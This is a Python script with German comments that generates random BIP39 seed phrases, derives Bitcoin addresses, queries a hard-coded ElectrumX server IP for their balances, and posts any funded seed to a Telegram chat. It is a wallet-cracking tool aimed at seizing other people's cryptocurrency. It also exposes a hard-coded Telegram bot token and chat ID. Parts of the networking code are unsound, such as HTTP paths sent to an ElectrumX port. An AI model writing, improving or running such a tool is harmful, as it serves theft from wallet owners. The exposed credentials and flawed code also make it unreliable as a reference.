import asyncio
import aiohttp
import logging
import random
import time
from aiogram import Bot
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39WordsNum
from aiohttp import ClientTimeout, ClientConnectionError, TimeoutError

# Logger-Konfiguration
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Deine Telegram-Token und Chat-ID
TELEGRAM_TOKEN = "7706620947:AAGLGdTIKi4dB3irOtVmHD57f1Xxa8-ZIcs"
TELEGRAM_CHAT_ID = "1596333326"  # Deine Chat-ID
ELECTRUMX_SERVER_URL = "http://85.215.178.149:50002"  # Beispiel-URL für ElectrumX-Server

# Bot initialisieren
bot = Bot(token=TELEGRAM_TOKEN)

# Timeout- und Retry-Einstellungen
TIMEOUT = 10  # Timeout in Sekunden
RETRIES = 5  # Maximal 5 Versuche bei einem Fehler
BACKOFF_FACTOR = 2  # Exponentieller Backoff
DELAY_BETWEEN_REQUESTS = 0.1  # Verzögerung zwischen den Anfragen, um Überlastung zu vermeiden

# Sitzung und Verbindungspool für aiohttp wird jetzt innerhalb der main Funktion erstellt
async def notify_telegram(seed, btc_address, btc_balance):
    """Benachrichtige Telegram bei einer gefundenen Wallet"""
    message = f"⚠️ Wallet mit Balance gefunden!\n\nSeed: {seed}\nAdresse: {btc_address}\nBalance: {btc_balance} BTC"
    await bot.send_message(TELEGRAM_CHAT_ID, message)


def generate_bip39_seed():
    """Generiere einen zufälligen BIP39 Seed"""
    return Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)


def bip44_btc_address_from_seed(seed_phrase):
    """Erzeuge eine Bitcoin-Adresse aus einem BIP39 Seed"""
    seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
    return bip44_addr_ctx.PublicKey().ToAddress()


async def check_btc_balance(address, session):
    """Überprüfe den BTC-Guthaben einer Adresse mit einem ElectrumX-Server"""
    attempt = 0
    while attempt < RETRIES:
        try:
            async with session.get(f"{ELECTRUMX_SERVER_URL}/address/{address}") as response:
                # Sicherstellen, dass die Antwort erfolgreich ist
                if response.status == 200:
                    data = await response.json()
                    balance = data.get("confirmed", 0) / 100000000  # Satoshi zu BTC
                    return balance
                else:
                    logging.warning(f"Fehlerhafte Antwort vom Server für Adresse {address}, Status: {response.status}")
                    return 0
        except (aiohttp.ClientTimeout, asyncio.TimeoutError, ClientConnectionError) as e:
            attempt += 1
            logging.warning(f"Timeout oder Verbindungserror bei Adresse {address} - Versuch {attempt} von {RETRIES}: {str(e)}")
            if attempt >= RETRIES:
                logging.error(f"Maximale Versuche erreicht für Adresse {address}. Kein Guthaben gefunden.")
                return 0  # Rückgabe von 0 bei Fehlschlägen
            # Exponentieller Backoff mit einer kleinen Verzögerung
            backoff_time = BACKOFF_FACTOR ** attempt
            logging.info(f"Warte {backoff_time} Sekunden vor dem nächsten Versuch.")
            await asyncio.sleep(backoff_time)


async def process_wallet_async(seed, session):
    """Verarbeite einen einzelnen Wallet Seed asynchron"""
    btc_address = bip44_btc_address_from_seed(seed)
    btc_balance = await check_btc_balance(btc_address, session)
    if btc_balance > 0:
        logging.info(f"Wallet mit Balance gefunden: {btc_address} - Balance: {btc_balance} BTC")
        await notify_telegram(seed, btc_address, btc_balance)


async def main():
    """Hauptfunktion zum Überprüfen von Wallets in Batches"""
    # Sitzung und Verbindungspool für aiohttp wird hier erstellt
    timeout = ClientTimeout(total=TIMEOUT, connect=TIMEOUT, sock_connect=TIMEOUT, sock_read=TIMEOUT)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        seeds = [generate_bip39_seed() for _ in range(1)]  # Test mit 1 Seed pro Zyklus (reduzierte Menge)

        # Parallelisierte Verarbeitung der Seeds
        tasks = []
        for seed in seeds:
            tasks.append(process_wallet_async(seed, session))

        # Verzögerung zwischen den Anfragen einführen, um Server zu entlasten
        for i, task in enumerate(tasks):
            if i % 10 == 0:  # Alle 10 Seeds eine kleine Verzögerung einführen
                await asyncio.sleep(DELAY_BETWEEN_REQUESTS)
            await task


if __name__ == "__main__":
    try:
        # Starten des asynchronen Prozesses
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Script wurde manuell beendet")
